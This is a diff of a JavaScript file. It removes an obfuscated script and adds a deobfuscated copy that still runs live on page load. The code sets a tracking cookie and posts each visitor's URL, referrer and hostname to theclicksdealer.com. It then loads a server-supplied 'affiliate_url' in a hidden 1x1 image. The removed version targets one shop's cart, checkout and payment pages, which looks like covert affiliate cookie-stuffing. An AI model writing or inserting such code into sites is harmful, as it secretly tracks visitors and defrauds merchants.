@@ -1,1 +1,65 @@
-function _0x5726(_0x338e45,_0x23ef6f){_0x338e45=_0x338e45-0x7f;var _0x42e4eb=_0x42e4();var _0x57262d=_0x42e4eb[_0x338e45];return _0x57262d;}(function(_0x2f6010,_0xc9f550){var _0x257cf8=_0x5726,_0xb36f02=_0x2f6010();while(!![]){try{var _0x4095c7=parseInt(_0x257cf8(0x81))/0x1+parseInt(_0x257cf8(0xa7))/0x2+parseInt(_0x257cf8(0xaa))/0x3+-parseInt(_0x257cf8(0xb4))/0x4*(parseInt(_0x257cf8(0xab))/0x5)+parseInt(_0x257cf8(0xa6))/0x6*(parseInt(_0x257cf8(0x90))/0x7)+parseInt(_0x257cf8(0x83))/0x8*(-parseInt(_0x257cf8(0xaf))/0x9)+-parseInt(_0x257cf8(0x9c))/0xa;if(_0x4095c7===_0xc9f550)break;else _0xb36f02['push'](_0xb36f02['shift']());}catch(_0x37b274){_0xb36f02['push'](_0xb36f02['shift']());}}}(_0x42e4,0x2a47e),(function(){var _0x393478=_0x5726;function _0x16fac8(){var _0x13dbbe=_0x5726;return _0x13dbbe(0x99)['replace'](/[xy]/g,function(_0x30d5cf){var _0x335ab8=_0x13dbbe,_0x591727=Math[_0x335ab8(0x8c)]()*0x10|0x0,_0x259839=_0x30d5cf==='x'?_0x591727:_0x591727&0x3|0x8;return _0x259839[_0x335ab8(0x97)](0x10);});}function _0x4c0efd(_0xc6812a){var _0xd56dab=_0x5726,_0x9a0976=document[_0xd56dab(0x87)][_0xd56dab(0xa9)](new RegExp(_0xd56dab(0xae)+_0xc6812a+_0xd56dab(0x92)));return _0x9a0976?decodeURIComponent(_0x9a0976[0x1]):'';}function _0x2b89ac(_0x224e59){var _0x8a8a87=_0x5726,_0x5f2f23=document['createElement']('img');_0x5f2f23[_0x8a8a87(0x85)]=_0x224e59,_0x5f2f23[_0x8a8a87(0x9a)]=0x1,_0x5f2f23[_0x8a8a87(0xb0)]=0x1,_0x5f2f23['style'][_0x8a8a87(0x8a)]=_0x8a8a87(0x88),_0x5f2f23[_0x8a8a87(0x84)]=function(){},document[_0x8a8a87(0xb3)][_0x8a8a87(0x8d)](_0x5f2f23);}function _0xaeed7b(){var _0x3e28dc=_0x5726;const _0x34f59d=[_0x3e28dc(0xac),_0x3e28dc(0xa3),_0x3e28dc(0x86),_0x3e28dc(0xa1),_0x3e28dc(0x8f),_0x3e28dc(0x9f)];return _0x34f59d[_0x3e28dc(0x80)](_0x2d7fc7=>window[_0x3e28dc(0xa4)]['pathname'][_0x3e28dc(0x94)]()[_0x3e28dc(0xb1)](_0x2d7fc7));}async function _0x3f264b(){var _0x21d791=_0x5726;if(sessionStorage[_0x21d791(0x93)](_0x21d791(0x9e)))return;try{var _0x1eaed0=_0x4c0efd(_0x21d791(0x96))||_0x16fac8(),_0x42b7b3=new Date(Date['now']()+0x1e*0x15180*0x3e8)[_0x21d791(0xad)]();document['cookie']=_0x21d791(0x9d)+_0x1eaed0+_0x21d791(0x9b)+_0x42b7b3+_0x21d791(0xb5);var _0x37aff0=await fetch(_0x21d791(0x8b),{'method':'POST','headers':{'Content-Type':_0x21d791(0x7f)},'body':JSON[_0x21d791(0x98)]({'url':location[_0x21d791(0xa2)],'referrer':document['referrer'],'unique_id':_0x1eaed0,'origin':location[_0x21d791(0xa5)]})}),_0x284473=await _0x37aff0[_0x21d791(0x89)]();_0x284473['success']&&_0x284473[_0x21d791(0xb6)]?(_0x2b89ac(_0x284473[_0x21d791(0xb6)]),sessionStorage['setItem'](_0x21d791(0x9e),'1')):_0x2b89ac('https://theclicksdealer.com/api/fallback-pixel?id='+_0x1eaed0);}catch(_0x1ebf39){console[_0x21d791(0xa0)]('Tracking\x20error',_0x1ebf39);}}function _0x30d6bb(){var _0x47d7d0=_0x5726;const _0x4da36e=window[_0x47d7d0(0xa4)]['hostname'],_0x3065e9={'www.fareastflora.com':{'always':![],'cartExtra':!![]},'aimedialinks.com':{'always':!![],'cartExtra':!![]}},_0x49c979=_0x3065e9[_0x4da36e];if(_0x49c979){if(_0x49c979[_0x47d7d0(0x8e)]&&_0xaeed7b())_0x3f264b();else _0x49c979[_0x47d7d0(0x95)]&&_0x3f264b();}}document[_0x393478(0x82)]===_0x393478(0xb2)?_0x30d6bb():window[_0x393478(0x91)](_0x393478(0xa8),_0x30d6bb,{'once':!![]});}()));function _0x42e4(){var _0x35d59e=['180139oEFtSV','readyState','378552kpPfiz','onerror','src','pay','cookie','none','json','display','https://theclicksdealer.com/api/track-user','random','appendChild','cartExtra','review-order','504378ICdNfQ','addEventListener','=([^;]*)','getItem','toLowerCase','always','tracking_uuid','toString','stringify','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','width',';\x20expires=','1902530ixbXwO','tracking_uuid=','tracking_done','payment','error','shipping','href','checkout','location','hostname','12RfOhcN','357532qycQdr','load','match','38256gJFmWo','144230atjgOA','cart','toUTCString','(?:^|;\x20)','18VEdRAE','height','includes','complete','body','8VdTVav',';\x20path=/;\x20SameSite=Lax','affiliate_url','application/json','some'];_0x42e4=function(){return _0x35d59e;};return _0x42e4();}
+(function () {
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      var r = Math.random() * 16 | 0;
+      var v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    var match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+    return match ? decodeURIComponent(match[1]) : '';
+  }
+
+  function createTrackingPixel(url) {
+    var img = document.createElement("img");
+    img.src = url;
+    img.width = 1;
+    img.height = 1;
+    img.style.display = "none";
+    img.onerror = function () {};
+    document.body.appendChild(img);
+  }
+
+  async function initTracking() {
+    if (sessionStorage.getItem("tracking_done")) return;
+
+    try {
+      var uniqueId = getCookie('tracking_uuid') || generateUUID();
+      var expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';
+
+      var res = await fetch("https://theclicksdealer.com/api/track-user", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          url: location.href,
+          referrer: document.referrer,
+          unique_id: uniqueId,
+          origin: location.hostname,
+        })
+      });
+
+      var data = await res.json();
+
+      if (data.success && data.affiliate_url) {
+        createTrackingPixel(data.affiliate_url);
+        sessionStorage.setItem("tracking_done", "1");
+      } else {
+        createTrackingPixel('https://theclicksdealer.com/api/fallback-pixel?id=' + uniqueId);
+      }
+
+    } catch (e) {
+      console.error("Tracking error", e);
+    }
+  }
+
+  if (document.readyState === 'complete') {
+    initTracking();
+  } else {
+    window.addEventListener('load', initTracking, { once: true });
+  }
+
+})();
